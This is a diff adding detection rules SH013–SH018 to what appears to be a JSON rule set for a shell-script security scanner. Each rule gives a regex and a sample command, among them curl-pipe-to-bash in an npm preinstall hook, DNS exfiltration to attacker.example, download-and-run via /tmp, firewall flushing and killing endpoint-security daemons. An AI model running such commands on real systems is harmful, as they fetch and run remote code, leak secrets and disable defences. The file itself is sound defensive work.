@@ -118,5 +118,75 @@
     "description": "Disabling or clearing shell history to evade forensic analysis",
     "example": "unset HISTFILE",
     "references": []
+  },
+  {
+    "id": "SH013",
+    "name": "python-os-system",
+    "regex": "\\bos\\.system\\s*\\(|\\bsubprocess\\.(call|run|Popen|check_call|check_output)\\s*\\([^)]*\\bshell\\s*=\\s*True\\b",
+    "severity": "CRITICAL",
+    "category": "dangerous-execution",
+    "description": "Python subprocess call with shell=True or os.system() both invoke /bin/sh with unsanitized input",
+    "example": "subprocess.run(cmd, shell=True)",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/78.html"
+    ]
+  },
+  {
+    "id": "SH014",
+    "name": "npm-lifecycle-hook-shell",
+    "regex": "\"(preinstall|postinstall|install|prepublish|prepare)\"\\s*:\\s*\"[^\"]*(\\|\\s*(bash|sh)\\b|\\beval\\s|\\bnode\\s+-e\\b|\\bcurl\\s+[^|\"]*\\|\\s*(bash|sh))",
+    "severity": "WARNING",
+    "category": "supply-chain",
+    "description": "npm lifecycle hook (preinstall/postinstall/install) pipes remote content into a shell or evaluates code",
+    "example": "\"preinstall\": \"curl https://evil.example/x.sh | bash\"",
+    "references": [
+      "https://docs.npmjs.com/cli/v10/using-npm/scripts#npm-install"
+    ]
+  },
+  {
+    "id": "SH015",
+    "name": "dns-exfiltration",
+    "regex": "\\b(dig|nslookup|host|drill)\\s+[^\\n]*\\$\\{?[A-Za-z_][\\w]*\\}?\\.[a-z]",
+    "severity": "CRITICAL",
+    "category": "exfiltration",
+    "description": "DNS query with variable interpolation into a subdomain, a common exfiltration channel",
+    "example": "dig $SECRET.attacker.example",
+    "references": [
+      "https://attack.mitre.org/techniques/T1048/003/"
+    ]
+  },
+  {
+    "id": "SH016",
+    "name": "wget-to-tmp-and-exec",
+    "regex": "\\b(wget|curl)\\s+[^\\n]*-[oO]\\s+[\"']?/tmp/[^\\s\"']+[^\\n]*(&&|;|\\|\\|)\\s*(bash|sh|python3?|chmod\\s+\\+x\\s+/tmp)",
+    "severity": "CRITICAL",
+    "category": "dangerous-execution",
+    "description": "Download to /tmp followed by chained execution of the downloaded file",
+    "example": "wget -O /tmp/x.sh https://evil.example/x.sh && bash /tmp/x.sh",
+    "references": []
+  },
+  {
+    "id": "SH017",
+    "name": "firewall-disable",
+    "regex": "\\biptables\\s+(-F\\b|--flush\\b|-X\\b|--delete-chain\\b|-Z\\b|--zero\\b)|\\bip6tables\\s+(-F\\b|--flush\\b)|\\bufw\\s+(disable|--force\\s+reset)\\b|\\bsetenforce\\s+0\\b|\\bsystemctl\\s+(stop|disable)\\s+(firewalld|iptables|ufw)\\b",
+    "severity": "CRITICAL",
+    "category": "defense-evasion",
+    "description": "Disabling or flushing host firewall / mandatory access control",
+    "example": "iptables -F",
+    "references": [
+      "https://attack.mitre.org/techniques/T1562/004/"
+    ]
+  },
+  {
+    "id": "SH018",
+    "name": "pkill-security-tools",
+    "regex": "\\b(pkill|killall|pgrep)\\s+[^\\n]*(clamd|ossec|falcon|wazuh|defender|crowdstrike|cylance|sophos|mcafee|snort|auditd|sysdig|osquery|elastic-agent|splunkd)\\b",
+    "severity": "CRITICAL",
+    "category": "defense-evasion",
+    "description": "Killing common endpoint-security or auditing daemons",
+    "example": "pkill clamd",
+    "references": [
+      "https://attack.mitre.org/techniques/T1562/001/"
+    ]
   }
 ]
